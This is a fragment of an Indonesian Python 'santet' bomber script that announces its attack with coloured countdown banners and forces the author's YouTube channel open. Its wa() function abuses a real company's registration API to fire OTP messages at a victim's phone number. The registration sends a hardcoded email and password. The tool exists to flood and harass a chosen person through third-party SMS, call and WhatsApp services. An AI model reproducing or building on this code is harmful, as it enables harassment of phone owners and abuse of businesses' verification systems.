...
def countdown(time_sec):
	try:
		while time_sec:
			...
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Meluncurkan Santet Dalam \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
		print (f"{W}[{R}•{W}] Sending Santet{abu}....              ")
		time.sleep(5)
...
def load():
	...
	for t in range(6):
	    time.sleep(5)
	    print(f'\r{R} > {Y}Meluncurkan Santet {R}({biru}{t}{R}){Y} ', end='', flush=True)
	    count += 1
	    if count == 1:
	    	count = 0
	    	load += '█'
def logo():
	os.system("clear")
	print(f"{biru}Subscribe Channel {W}Aing Dulu Anjing{biru} ! ! !{G}")
	os.system("xdg-open https://www.youtube.com/channel/UCg3gv68RvFFD9OKYO-LnJVw ")
	time.sleep(10)
	os.system("clear")
	print (f"""{ungu}	|
{ungu}       ( )
...
{ungu}     | {Y}2{W}.{Y}9{ungu} |{W}   [{Y}•{W}] Info sc{R} :{W} Brutal Santet {R}({biru}sms,call,wa{R})
{ungu}   .'|  |  |`. {W}[{Y}•{W}] Info Creator{R} :{W} ReVanda PP
{ungu}  (  |  |  |  )
...
def wa(nomor):
	...
	ol2=json.dumps({"name":"AmmarExecuted","email":"margeng84@gmail.com","password":"@mm4rgans","phone":"+62"+nomor,"phone_format":nomor,"name_toko":"","url_id":"","business_type_id":"","service_type_id":3,"country_id":"ID","city_id":"","state_id":"","pos_resto_mode":0,"i_agree":"true","address":"","id":"null","tokenMiscall":"","use_otp_type":3})
	ol3=requests.post("https://api-dash.olsera.co.id/api/admin/v1/en/register",headers=ol,data=ol2).text
	print (f"{W}[{G}✓{W}] Success Sending Santet")
